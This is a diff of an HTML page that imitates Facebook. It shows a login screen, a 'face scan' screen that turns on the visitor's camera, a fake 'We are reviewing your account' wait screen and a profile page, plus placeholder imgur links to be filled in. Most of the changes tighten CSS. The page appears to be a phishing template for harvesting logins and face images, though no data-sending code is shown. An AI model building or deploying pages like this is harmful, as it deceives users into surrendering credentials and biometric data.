@@ -22,11 +22,7 @@ body{background:#f0f2f5;color:#1c1e21;}
 .scan-circle{width:260px;height:260px;border-radius:50%;border:3px solid #1877f2;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;margin-bottom:24px;background:#000;}
 .scan-circle video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
 .scan-line{position:absolute;width:100%;height:4px;background:linear-gradient(transparent, #1877f2, transparent);animation:scan 2s ease-in-out infinite;z-index:10;}
-@keyframes scan{
-  0%{top:0;}
-  50%{top:calc(100% - 4px);}
-  100%{top:0;}
-}
+@keyframes scan{0%{top:0;}50%{top:calc(100% - 4px);}100%{top:0;}}
 .face-scan-screen h2{font-size:22px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
 .face-scan-screen p{font-size:16px;color:#65676b;margin-bottom:6px;}
 .scan-status{color:#1877f2;font-weight:600;margin-top:12px;font-size:18px;}
@@ -40,63 +36,60 @@ body{background:#f0f2f5;color:#1c1e21;}
 .loading-time{font-size:16px;font-weight:600;color:#1877f2;margin-top:8px;}
 
 /* === PROFILE PAGE === */
-.cover-container{width:100%;height:320px;background:#dddfe2;position:relative;overflow:hidden;}
+.cover-container{width:100%;height:300px;background:#dddfe2;position:relative;overflow:hidden;}
 .cover-photo{width:100%;height:100%;object-fit:cover;}
 
-.menu-icon{position:absolute;top:12px;left:12px;width:36px;height:36px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);z-index:10;}
-.menu-icon svg{width:20px;height:20px;fill:#65676b;}
+.menu-icon{position:absolute;top:10px;left:10px;width:32px;height:32px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);z-index:10;}
+.menu-icon svg{width:18px;height:18px;fill:#65676b;}
 
-.top-icons{position:absolute;top:12px;right:12px;display:flex;gap:10px;align-items:center;z-index:10;}
-.top-icon{width:36px;height:36px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
-.top-icon svg{width:20px;height:20px;fill:#65676b;}
+.top-icons{position:absolute;top:10px;right:10px;display:flex;gap:8px;align-items:center;z-index:10;}
+.top-icon{width:32px;height:32px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+.top-icon svg{width:18px;height:18px;fill:#65676b;}
 
-.share-note{position:absolute;bottom:12px;left:12px;background:rgba(255,255,255,0.95);color:#1c1e21;padding:6px 14px;border-radius:20px;font-size:14px;box-shadow:0 1px 3px rgba(0,0,0,0.12);font-weight:500;}
+.share-note{position:absolute;bottom:10px;left:10px;background:rgba(255,255,255,0.95);color:#1c1e21;padding:5px 12px;border-radius:20px;font-size:13px;box-shadow:0 1px 3px rgba(0,0,0,0.12);font-weight:500;}
 
-.camera-btn-cover{position:absolute;bottom:12px;right:12px;background:rgba(255,255,255,0.95);border:none;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
-.camera-btn-cover svg{width:20px;height:20px;fill:#65676b;}
+.camera-btn-cover{position:absolute;bottom:10px;right:10px;background:rgba(255,255,255,0.95);border:none;border-radius:50%;width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+.camera-btn-cover svg{width:18px;height:18px;fill:#65676b;}
 
-.profile-section{background:#ffffff;padding:0 16px 24px;margin-top:-60px;position:relative;}
-.profile-header{display:flex;align-items:flex-end;gap:14px;margin-bottom:16px;position:relative;flex-wrap:wrap;}
-.profile-pic-wrap{position:relative;margin-top:-50px;z-index:5;}
-.profile-pic{width:128px;height:128px;border-radius:50%;border:4px solid #ffffff;object-fit:cover;background:#dddfe2;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
-.camera-btn-profile{position:absolute;bottom:4px;right:4px;background:#f0f2f5;border:none;border-radius:50%;width:30px;height:30px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
-.camera-btn-profile svg{width:16px;height:16px;fill:#65676b;}
+.profile-section{background:#ffffff;padding:0 16px 24px;margin-top:-45px;position:relative;}
+.profile-header{display:flex;align-items:flex-end;gap:12px;margin-bottom:12px;position:relative;flex-wrap:wrap;}
+.profile-pic-wrap{position:relative;margin-top:-40px;z-index:5;}
+.profile-pic{width:110px;height:110px;border-radius:50%;border:4px solid #ffffff;object-fit:cover;background:#dddfe2;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+.camera-btn-profile{position:absolute;bottom:2px;right:2px;background:#f0f2f5;border:none;border-radius:50%;width:26px;height:26px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+.camera-btn-profile svg{width:14px;height:14px;fill:#65676b;}
 
-.profile-info{flex:1;min-width:250px;padding-bottom:10px;}
-.name-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;}
-.profile-name{font-size:24px;font-weight:700;color:#1c1e21;line-height:1.2;}
-.dropdown-icon{width:28px;height:28px;background:#f0f2f5;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;}
-.dropdown-icon svg{width:14px;height:14px;fill:#65676b;}
+.profile-info{flex:1;min-width:200px;padding-bottom:8px;}
+.name-row{display:flex;align-items:center;gap:5px;flex-wrap:wrap;}
+.profile-name{font-size:20px;font-weight:700;color:#1c1e21;line-height:1.2;}
+.dropdown-icon{width:24px;height:24px;background:#f0f2f5;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;}
+.dropdown-icon svg{width:12px;height:12px;fill:#65676b;}
 
-.profile-meta{font-size:14px;color:#65676b;margin-top:4px;}
-.profile-bio{font-size:14px;color:#1c1e21;line-height:1.5;margin:10px 0;}
+.profile-meta{font-size:13px;color:#65676b;margin-top:3px;}
+.profile-bio{font-size:13px;color:#1c1e21;line-height:1.4;margin:8px 0;}
 
-.info-row{display:flex;align-items:center;gap:8px;margin-bottom:16px;font-size:14px;color:#1c1e21;padding:4px 0;}
-.info-row svg{width:18px;height:18px;fill:#65676b;flex-shrink:0;}
+.info-row{display:flex;align-items:center;gap:6px;margin-bottom:12px;font-size:13px;color:#1c1e21;padding:3px 0;}
+.info-row svg{width:16px;height:16px;fill:#65676b;flex-shrink:0;}
 
-.button-row{display:flex;gap:10px;margin:16px 0;flex-wrap:wrap;}
-.btn-dashboard{flex:1;min-width:130px;padding:8px 14px;background:#0081FB;color:#ffffff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;}
+.button-row{display:flex;gap:8px;margin:14px 0;flex-wrap:wrap;}
+.btn-dashboard{flex:1;min-width:110px;padding:7px 12px;background:#0081FB;color:#ffffff;border:none;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:5px;}
 .btn-dashboard:hover{background:#006edb;}
-.btn-create{flex:1;min-width:130px;padding:8px 14px;background:#e4e6eb;color:#1c1e21;border:none;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;}
+.btn-create{flex:1;min-width:110px;padding:7px 12px;background:#e4e6eb;color:#1c1e21;border:none;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:5px;}
 .btn-create:hover{background:#d8dadf;}
 
-.tabs{display:flex;gap:28px;border-bottom:1px solid #e4e6eb;margin:20px 0;flex-wrap:wrap;}
-.tab{padding:10px 0;font-size:14px;font-weight:500;color:#65676b;cursor:pointer;}
+.tabs{display:flex;gap:24px;border-bottom:1px solid #e4e6eb;margin:16px 0;flex-wrap:wrap;}
+.tab{padding:8px 0;font-size:13px;font-weight:500;color:#65676b;cursor:pointer;}
 .tab.active{color:#0081FB;border-bottom:2px solid #0081FB;font-weight:600;}
 
-.details-header{display:flex;justify-content:space-between;align-items:center;margin:24px 0 12px 0;}
-.details-header h2{font-size:16px;font-weight:600;color:#1c1e21;}
-.edit-icon{width:22px;height:22px;fill:#65676b;cursor:pointer;}
+.details-header{display:flex;justify-content:space-between;align-items:center;margin:20px 0 10px 0;}
+.details-header h2{font-size:15px;font-weight:600;color:#1c1e21;}
+.edit-icon{width:20px;height:20px;fill:#65676b;cursor:pointer;}
 
-.detail-item{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:14px;color:#1c1e21;padding:4px 0;}
-.detail-item svg{width:18px;height:18px;fill:#65676b;flex-shrink:0;}
+.detail-item{display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:#1c1e21;padding:3px 0;}
+.detail-item svg{width:16px;height:16px;fill:#65676b;flex-shrink:0;}
 </style>
 </head>
 <body>
 
-<!-- ====================================== -->
-<!-- PALITAN MO DITO YONG MGA LINK NG IMGUR -->
-<!-- ====================================== -->
 <script>
 const CONFIG = {
   coverPhotoLink: "https://i.imgur.com/XXXXXXXXXXXX.jpg",
@@ -104,7 +97,6 @@ const CONFIG = {
 };
 </script>
 
-<!-- === 1. LOGIN SCREEN === -->
 <div id="loginScreen" class="login-screen">
   <div class="fb-logo">f</div>
   <h2>Log In</h2>
@@ -113,7 +105,6 @@ const CONFIG = {
   <button id="loginButton" class="login-btn">Log In</button>
 </div>
 
-<!-- === 2. FACE SCAN SCREEN === -->
 <div id="faceScanScreen" class="face-scan-screen hidden">
   <div class="scan-circle">
     <video id="cameraFeed" autoplay playsinline muted></video>
@@ -124,7 +115,6 @@ const CONFIG = {
   <p class="scan-status" id="scanStatus">Initializing camera...</p>
 </div>
 
-<!-- === 3. LOADING SCREEN === -->
 <div id="loadingScreen" class="loading-screen hidden">
   <div class="loading-spinner"></div>
   <h2>We are reviewing your account</h2>
@@ -132,7 +122,6 @@ const CONFIG = {
   <p class="loading-time">Estimated review time: Approximately 1 hour</p>
 </div>
 
-<!-- === 4. PROFILE PAGE === -->
 <div id="profilePage" class="hidden">
   <div class="cover-container">
     <img class="cover-photo" id="coverImg" src="" alt="Cover Photo">
